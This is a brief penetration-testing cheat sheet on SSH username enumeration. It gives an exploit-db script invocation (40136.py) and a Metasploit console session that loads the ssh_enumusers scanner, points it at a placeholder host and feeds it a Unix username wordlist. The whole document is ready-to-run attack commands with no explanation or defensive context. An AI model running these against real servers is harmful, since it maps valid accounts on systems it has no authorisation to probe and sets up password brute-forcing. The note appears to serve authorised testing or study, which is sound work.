## == SSH user enumeration ==  
  
1)  
python ./40136.py x.x.x.x  
  
  
  
2)  
msf > use auxiliary/scanner/ssh/ssh_enumusers  
msf auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS x.x.x.x  
RHOSTS => x.x.x.x  
msf auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt  
USER_FILE => /usr/share/wordlists/metasploit/unix_users.txt  
msf auxiliary(scanner/ssh/ssh_enumusers) > run